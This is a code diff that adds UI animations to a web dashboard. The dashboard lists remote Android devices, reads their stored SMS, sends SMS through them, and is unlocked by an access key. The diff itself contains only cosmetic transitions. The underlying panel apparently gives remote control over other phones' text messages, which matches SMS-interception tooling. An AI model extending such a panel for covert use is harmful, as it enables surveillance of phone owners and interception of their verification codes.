@@ -128,11 +128,17 @@ function processClientsData(){
   if(!selDev&&allDevs.length)selDev=allDevs[0].id;
   renderDevices();updateStats();updateFbUi();
 }
+function animNum(el,val){
+  if(!el)return;
+  if(String(el.textContent)!==String(val)){el.classList.remove('tick');void el.offsetWidth;el.classList.add('tick');}
+  el.textContent=val;
+}
 function updateStats(){
   var l=getFilteredDevs();
-  document.getElementById('stTotal').textContent=l.length;
-  document.getElementById('stOnline').textContent=l.filter(function(d){return d.status==='online';}).length;
-  document.getElementById('stOffline').textContent=l.filter(function(d){return d.status==='offline';}).length;
+  animNum(document.getElementById('stTotal'),l.length);
+  animNum(document.getElementById('stOnline'),l.filter(function(d){return d.status==='online';}).length);
+  animNum(document.getElementById('stOffline'),l.filter(function(d){return d.status==='offline';}).length);
+  document.querySelectorAll('.stat-card').forEach(function(c){c.classList.remove('bump');void c.offsetWidth;c.classList.add('bump');});
 }
 function fetchSummaryNode(inst,node){
   return restJson(inst.restUrl+'/'+node+'.json').then(function(raw){mergeSummaryNode(inst.id,node,raw);processClientsData();});
@@ -164,15 +170,19 @@ function fetchAllData(){
     if(selDev)loadSmsForDevice();
   });
 }
-function refreshData(){toast('Refreshing...',true);fetchAllData();}
+function refreshData(){
+  var btn=document.getElementById('refreshBtn');
+  if(btn){btn.classList.add('spinning');setTimeout(function(){btn.classList.remove('spinning');},900);}
+  toast('Refreshing...',true);fetchAllData();
+}
 
 function renderDevices(){
   var q=(document.getElementById('devSearch').value||'').toLowerCase();
   var list=getFilteredDevs().filter(function(d){return !q||(d.displayPhone+d.name+d.rawId).toLowerCase().includes(q);});
   var el=document.getElementById('devList');
   if(!list.length){el.innerHTML='<div class="empty-state"><div class="ico">📡</div>No devices yet<br><span style="font-size:11px;opacity:.6">Pull refresh or wait for sync</span></div>';return;}
-  el.innerHTML=list.map(function(d){
-    return '<div class="dev-card '+d.status+(d.id===selDev?' active':'')+'" onclick="selectDevice(\''+d.id+'\')">'+
+  el.innerHTML=list.map(function(d,i){
+    return '<div class="dev-card '+d.status+(d.id===selDev?' active':'')+'" style="animation-delay:'+(i*0.05)+'s" onclick="selectDevice(\''+d.id+'\')">'+
       '<div class="dev-bar"></div><div class="dev-body">'+
       '<div class="dev-phone">'+esc(d.displayPhone)+'</div>'+
       '<div class="dev-meta">'+esc(d.name)+' · '+esc(d.rawId.substring(0,14))+'</div>'+
@@ -257,9 +267,9 @@ function renderSms(){
   var d=getSelDev(),el=document.getElementById('smsList');
   if(!d){document.getElementById('smsEmpty').classList.remove('hidden');el.innerHTML='';return;}
   if(!window_sms.length){el.innerHTML='<div class="empty-state"><div class="ico">📭</div>No SMS on this device</div>';return;}
-  el.innerHTML=window_sms.map(function(s){
+  el.innerHTML=window_sms.map(function(s,i){
     var out=s.type==='sent'||s.type==='outbox';
-    return '<div class="sms-bubble '+(out?'out':'in')+'">'+
+    return '<div class="sms-bubble '+(out?'out':'in')+'" style="animation-delay:'+(Math.min(i,12)*0.04)+'s">'+
       '<div class="sms-from">'+esc(s.address)+(out?'':'')+'</div>'+
       esc(s.body)+'<div class="sms-time">'+esc(s.date_readable)+'</div></div>';
   }).join('');
@@ -279,11 +289,17 @@ function sendSms(){
   }).catch(function(){document.getElementById('sendStatus').textContent='❌ Error';toast('Network error',false);});
 }
 
+var TAB_ORDER=['home','device','sms','send','more'],_lastTab='home';
 function switchTab(name,btn){
-  document.querySelectorAll('.screen').forEach(function(s){s.classList.remove('active');});
-  document.getElementById('screen-'+name).classList.add('active');
+  var oldIdx=TAB_ORDER.indexOf(_lastTab),newIdx=TAB_ORDER.indexOf(name);
+  var dir=newIdx>oldIdx?'from-right':'from-left';
+  document.querySelectorAll('.screen').forEach(function(s){s.classList.remove('active','from-left','from-right');});
+  var screen=document.getElementById('screen-'+name);
+  if(screen&&oldIdx>=0&&newIdx>=0&&oldIdx!==newIdx)screen.classList.add(dir);
+  screen.classList.add('active');
   document.querySelectorAll('.nav-item').forEach(function(n){n.classList.remove('active');});
   if(btn)btn.classList.add('active');
+  _lastTab=name;
   if(name==='sms'&&selDev)loadSmsForDevice();
   if(name==='device')renderDeviceView();
   if(name==='send')updateSendForm();
@@ -313,19 +329,26 @@ function getSession(){try{return JSON.parse(localStorage.getItem('rbl_session')|
 function unlockApp(token,exp,remember){
   var s={token:token,exp:exp||0};
   if(remember)localStorage.setItem('rbl_session',JSON.stringify(s));else sessionStorage.setItem('rbl_session',JSON.stringify(s));
-  document.getElementById('loginScreen').classList.add('hidden');
-  document.getElementById('appShell').classList.remove('hidden');
-  if(!panelReady){panelReady=true;fetchAllData();loadAutoTokenState();}
+  var login=document.getElementById('loginScreen'),app=document.getElementById('appShell');
+  login.classList.add('login-out');
+  setTimeout(function(){
+    login.classList.add('hidden');
+    app.classList.remove('hidden');
+    app.classList.add('app-enter');
+    if(!panelReady){panelReady=true;fetchAllData();loadAutoTokenState();}
+  },380);
 }
 function doLogin(){
   var key=(document.getElementById('loginKey').value||'').trim().toUpperCase();
   if(!key){document.getElementById('loginErr').textContent='Enter access key';document.getElementById('loginErr').style.display='block';return;}
-  document.getElementById('loginBtn').disabled=true;
+  var btn=document.getElementById('loginBtn'),errEl=document.getElementById('loginErr');
+  btn.disabled=true;btn.classList.add('loading');
   authFetch({action:'login',key:key}).then(function(res){
-    document.getElementById('loginBtn').disabled=false;
+    btn.disabled=false;btn.classList.remove('loading');
     if(res.ok&&res.data&&res.data.ok){unlockApp(res.data.token,res.data.expires,document.getElementById('rememberMe').checked);return;}
-    document.getElementById('loginErr').textContent=res.data&&res.data.error||'Invalid key';
-    document.getElementById('loginErr').style.display='block';
+    errEl.textContent=res.data&&res.data.error||'Invalid key';
+    errEl.style.display='block';
+    errEl.classList.remove('shake');void errEl.offsetWidth;errEl.classList.add('shake');
   });
 }
 function doLogout(){
@@ -367,8 +390,15 @@ function useSelForAutoToken(){
 
 /* BOOT */
 (function(){
+  function hideBoot(){
+    var s=document.getElementById('bootSplash');
+    if(!s)return;
+    s.classList.add('hide');
+    setTimeout(function(){if(s.parentNode)s.parentNode.removeChild(s);},500);
+  }
+  window.addEventListener('load',function(){setTimeout(hideBoot,700);});
   if(window.RebelAndroid){
     var c=parseJson(RebelAndroid.checkSession());
-    if(c&&c.ok){var s=getSession();if(s&&s.token)unlockApp(s.token,s.exp,true);}
+    if(c&&c.ok){var s=getSession();if(s&&s.token){hideBoot();unlockApp(s.token,s.exp,true);return;}}
   }
 })();
